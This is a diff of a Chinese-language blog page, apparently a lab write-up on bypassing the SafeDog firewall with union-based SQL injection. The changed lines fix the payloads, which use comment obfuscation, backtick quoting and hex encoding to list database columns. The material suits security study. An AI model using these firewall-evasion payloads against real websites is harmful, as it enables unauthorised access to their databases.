@@ -141,8 +141,9 @@
 <meta property="og:image" content="http://cuokon.github.com/image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/14.png">
 <meta property="og:image" content="http://cuokon.github.com/image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/15.png">
 <meta property="og:image" content="http://cuokon.github.com/image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/16.png">
+<meta property="og:image" content="http://cuokon.github.com/image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/16.png">
 <meta property="og:image" content="http://cuokon.github.com/image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/17.png">
-<meta property="og:updated_time" content="2019-10-21T07:43:27.787Z">
+<meta property="og:updated_time" content="2019-10-21T07:51:27.883Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sql过狗(联合注入)">
 <meta name="twitter:description" content="实验环境window server 2012: 安全狗4.0 过狗首先第一步进行sql注入测试,在进行1&amp;#39; or 1=1的时候肯定是会被拦截的,因为最近做了一些ctf题目,知道可以用运算符来进行sql注入测试。首先来了解一下基本的原理一个字符串除0会返回NULL一个字符串除大于0的数会返回0一个字符串乘数字会大于0 那根据上面测试的结果进行sql注入测试返回了除了值等于NULL的数据没有返">
@@ -459,7 +460,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-10-21 15:43:27" itemprop="dateModified" datetime="2019-10-21T15:43:27+08:00">2019-10-21</time>
+                <time title="修改时间：2019-10-21 15:51:27" itemprop="dateModified" datetime="2019-10-21T15:51:27+08:00">2019-10-21</time>
               </span>
             
           
@@ -557,13 +558,13 @@
 
 <p><img src="../../../../image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/15.png" alt="15"></p>
 <p>爆破列名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union /*!10244select*/ 1,(select group_concat(column_name) from `information_schema`.columns where table_schema=(database/**/()) and table_name=&apos;user&apos;),3%23</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union /*!10244select*/ 1,(select group_concat(column_name) from `information_schema`.columns where table_schema=(database/**/()) and table_name=&apos;class&apos;),3%23</span><br></pre></td></tr></table></figure>
 
-<p>发现被拦截了,经过测试是在table_name=’user’这里被拦截,我们依然可以用``进行绕过。</p>
+<p><img src="../../../../image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/16.png" alt="16"><br>发现被拦截了,经过测试是在table_name=’class’这里被拦截,我们依然可以用``进行绕过。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union /*!10244select*/ 1,(select group_concat(column_name) from `information_schema`.columns where table_schema=(database/**/()) and `table_name`=&apos;class&apos;),3%23</span><br></pre></td></tr></table></figure>
 
-<p>发现被拦截了,然后尝试吧class转换为hex在进行绕过<br><img src="../../../../image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/16.png" alt="16"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union /*!10244select*/ 1,(select group_concat(column_name) from `information_schema`.columns where table_schema=(database/**/()) and `table_name`=&apos;class&apos;),3%23</span><br></pre></td></tr></table></figure>
+<p><img src="../../../../image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/16.png" alt="16"><br>发现被拦截了,然后尝试吧class转换为hex在进行绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union /*!10244select*/ 1,(select group_concat(column_name) from `information_schema`.columns where table_schema=(database/**/()) and `table_name`=0x636c617373),3%23</span><br></pre></td></tr></table></figure>
 
 <p><img src="../../../../image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/17.png" alt="enter description here"></p>
 
